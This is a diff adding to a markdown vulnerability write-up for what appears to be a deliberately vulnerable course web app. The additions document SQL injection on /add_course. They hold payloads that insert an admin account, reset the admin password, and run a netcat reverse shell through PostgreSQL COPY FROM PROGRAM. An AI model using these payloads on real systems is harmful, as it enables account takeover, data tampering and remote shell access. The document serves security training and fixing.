@@ -3,6 +3,7 @@
 ## Vulnerabilities
 
 ### SQL Injection
+#### Retrieve Data
 Paths: `/login` and `/index`
 Methods: `GET, POST`
 
@@ -30,6 +31,29 @@ Resources: [Sqli CheatSheet](https://book.hacktricks.xyz/pentesting-web/sql-inje
 **SQL Fix:**
 ```
 cur.execute("SELECT user_id, role FROM users WHERE username = %s AND password = %s", (username, password))
+```
+
+#### Insert/Update/Delete Data
+**Examples**
+Path: `/add_course`
+Methods: `GET, POST`
+
+*Note:* You must select instructor and set image_path for this to work.
+```
+# In title section (Add new admin user)
+New Course', 'Malicious Description', 1, 'image.jpg'); INSERT INTO users (username, password, role) VALUES ('evil', 'evil', 'admin'); --
+
+# Update admin password
+New Course', 'test', 1, 'test.jpg'); UPDATE users SET password = 'testing' WHERE username = 'admin'; --
+```
+
+#### RCE Via SQL Injection (Postgresql)
+Path: `/add_course`
+Methods: `GET, POST`
+
+**Example:**
+```
+NewCourse', 'test', 1, 'test'); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f'; SELECT * FROM cmd_exec;--
 ```
 
 ### Server-Side Template Injection
